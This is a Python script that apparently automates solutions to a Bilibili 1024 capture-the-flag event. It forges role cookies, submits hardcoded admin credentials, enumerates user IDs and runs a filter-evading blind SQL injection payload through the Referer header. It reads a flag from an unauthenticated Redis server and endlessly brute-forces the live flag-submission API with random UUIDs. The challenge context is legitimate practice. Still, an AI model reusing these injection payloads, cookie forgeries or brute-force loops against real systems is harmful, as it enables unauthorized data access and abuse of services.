import requests
import json
import redis
import uuid
import threading
import random
sessionMy='session='+""#你的bilibili 1024的session
bilibiliCookie="" #在提交页面的 /flag 的cookie
class Lucky(Exception):
    pass
def func1(session,isPush):
    url1='http://45.113.201.36/api/admin'
    head1={"User-Agent":"bilibili Security Browser",
    'Cookie':session}
    req1=requests.get(url1,headers=head1)
    print("flag1:",req1.text)
    if(isPush):
        return push(1,json.loads(req1.text)["flag"],bilibiliCookie)
def func2(session,isPush):
    url2="http://45.113.201.36/api/ctf/2"
    head2={"User-Agent":"bilibili Security Browser",
    'Cookie':session}
    req2=requests.get(url2,headers=head2)
    print("flag2:",req2.text)
    if(isPush):
        return push(2,json.loads(req2.text)["flag"],bilibiliCookie)
def func3(session,isPush):
    url3="http://45.113.201.36/api/ctf/3"
    head3={"User-Agent":"bilibili Security Browser",
    'Cookie':'role=ee11cbb19052e40b07aac0ca060c23ee; '+session}
    req3=requests.post(url3,data='{username: "admin", passwd: "bilibili"}',headers=head3)
    print("flag3:",req3.text)
    if(isPush):
        return push(3,json.loads(req3.text)["flag"],bilibiliCookie)
def func4(session,isPush):
    url4="http://45.113.201.36/api/ctf/4"
    head4={"User-Agent":"bilibili Security Browser",
    'Cookie':session+'; role=7b7bc2512ee1fedcd76bdc68926d4f7b'}
    req4=requests.get(url4,headers=head4)
    print('flag4:',req4.text)
    if(isPush):
        return push(4,json.loads(req4.text)["flag"],bilibiliCookie)
def func5(session,isPush,tryNum,result):
    url5="http://45.113.201.36/api/ctf/5?uid=%s"
    int5=100336889
    head5={"User-Agent":"bilibili Security Browser",
    'Cookie':'role=ee11cbb19052e40b07aac0ca060c23ee; '+session}
    for i in range(tryNum):#range(1000)
        if(tryNum==1): req5=requests.get(url5%(result+int5),headers=head5)
        else: req5=requests.get(url5%(i+int5),headers=head5)
        if(json.loads(req5.text)["code"]=="200"):print(url5%(i+int5))
        print("flag5:",req5.text)
        
# https://github.com/interesting-1024/end/issues/283

def func6(session,isPush):
    url='http://120.92.151.189/blog/single.php?id=1'
    flag=''
    for i in range(1,35):
        left=33
        right=128
        while right-left!=1:
            mid=(left+right)//2
            payload="0123'^if(substr((selselectect flag from flag),{i},1)>binary {mid},(selecselectt 1+~0),0) ununionion selecselectt 1,2#".format(i=int(i),mid=hex(mid))
            headers={
                'Referer':payload
            }
            r=requests.get(url=url,headers=headers)
            if len(r.text) == 5596:
                left=mid
            else:
                right=mid
        
        if(len(flag)!=35):flag+=chr(right)
        else:print("flag6:",flag)
    if(isPush):
        return push(6,flag,bilibiliCookie)
def func8():
    r=redis.Redis(host="120.92.151.189",port=6379,decode_responses=True)
    for i in range(1):#range(1,11)
        q="flag"+str(8)
        try:
            print("flag8:",r.get(q))
        except:print("falut")
def func10(session,isPush):
    print("flag10:","2ebd3b08-47ffc478-b49a5f9d-f6099d65")
    if(isPush):
        push(10,"2ebd3b08-47ffc478-b49a5f9d-f6099d65",bilibiliCookie)
def always(session,add=1):
    ii=25526
    while True:
        flag=uuid.uuid4()
        for i in [7,9]:
            ii+=add
            p=push(i,str(flag),bilibiliCookie)
            if(p=="Flag错误，请继续努力"):
                print(p)
                print(str(flag)+" "+str(ii))
            else:
                print("#####################################")
                print(p)
                print("#####################################")
                raise Lucky()
def push(ctf_id,flag,biliCookie):
    urlpush="https://security.bilibili.com/sec1024/api/v1/flag"
    headpush={'cookie': biliCookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51'}
    reqt=requests.post(urlpush,data='{\"flag\": \"%s\", \"ctf_id\": %s}'%(str(flag),ctf_id),headers=headpush,verify=False)
    if(json.loads(reqt.text)["msg"]=="Flag错误，请继续努力"):
        return "Flag错误，请继续努力"
    else:
        return str(ctf_id)+"##"+str(flag)+"##"+reqt.text
if __name__ == "__main__":
    func1(sessionMy,False)
    func2(sessionMy,False)
    func3(sessionMy,False)
    func4(sessionMy,False)
    func5(sessionMy,False,1,81)
    func6(sessionMy,False)
    func8()
    func10(sessionMy,False)
    always(sessionMy)
